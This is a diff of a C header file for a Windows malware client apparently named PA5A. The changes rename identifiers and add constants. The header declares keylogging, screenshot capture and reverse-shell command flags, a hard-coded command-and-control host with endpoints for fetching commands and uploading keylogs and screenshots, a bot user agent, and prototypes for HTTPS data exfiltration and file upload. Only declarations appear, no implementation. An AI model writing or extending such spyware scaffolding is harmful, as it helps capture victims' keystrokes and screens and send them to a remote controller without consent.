@@ -17,13 +17,14 @@
 #pragma comment(lib, "crypt32")
 #pragma comment(lib, "gdiplus")
 #pragma comment(lib, "wininet")
+
 EXTERN_C_START
 
-struct CommandsToExecute
+struct Commands
 {
 	BOOL keylogs;
 	BOOL screenshot;
-	BOOL reverse_shell;
+	BOOL reverseShell;
 };
 
 //Pour afficher les informations de debogage
@@ -33,17 +34,22 @@ struct CommandsToExecute
 #define DATA_FOLDER_A		"C:\\ProgramData\\PA5A\\"
 #define DATA_FOLDER_W		L"C:\\ProgramData\\PA5A\\"
 #define SCREENSHOT_FILE_W	L"screenshot.jpeg"
-#define SERVER_URL_A		"pa5a.cyberfilou.site"
-#define SERVER_URL_W		L"pa5a.cyberfilou.site"
+#define SERVER_NAME_A		"pa5a.cyberfilou.site"
+#define SERVER_NAME_W		L"pa5a.cyberfilou.site"
+#define USER_AGENT_A		"PA5A-BOT"
+#define USER_AGENT_W		L"PA5A-BOT"
 #define HTTP_PORT			80
 #define HTTPS_PORT			443
 #define CLIENT_API_A		"/api/clients/"
 #define COMMANDS_API_A		"/commands"
 #define KEYLOGS_API_A		"/keylogs"
 #define SCREENSHOT_API_A	"/screenshot"
+#define PATH_SIZE			2048
 #define URL_SIZE			4096
 #define UUID_SIZE			256
 #define COMPUTER_NAME_SIZE	256
+
+typedef struct Commands Commands;
 
 /********************************************************************************************************************************************************/
 //main.cpp
@@ -52,10 +58,9 @@ DWORD ThreadProcPolling(HANDLE param);
 /********************************************************************************************************************************************************/
 //http.cpp
 VOID GenerateBoundary(LPSTR buffer, SIZE_T size);
-struct CommandsToExecute GetCommands(LPCSTR server, DWORD port);
+Commands GetCommands(LPCSTR server, DWORD port);
 BOOL SendJsonDataByHttps(LPCSTR server, DWORD port, LPCSTR url, LPCSTR method, LPCSTR userAgent, LPCSTR jsonData);
-cJSON* CreateJsonInformationsObject(LPCSTR pcName);
-BOOL sendClientInformations();
+BOOL SendClientInformations();
 BOOL WINAPI http_upload_file(LPCSTR server, DWORD port, LPCSTR script, LPCSTR szParam, LPCSTR szValue, LPCWSTR filenameW);
 /********************************************************************************************************************************************************/
 //Keylogger.cpp
@@ -65,7 +70,6 @@ cJSON* CreateJsonLogsObject(PCHAR logs, PCHAR app, PCHAR path);
 VOID WriteJsonObjectLogs(cJSON* newJsonObject);
 /********************************************************************************************************************************************************/
 int GetUuid(char* uuid);
-struct CommandsToExecute GetCommands(LPCSTR server, DWORD port);
 
 
 
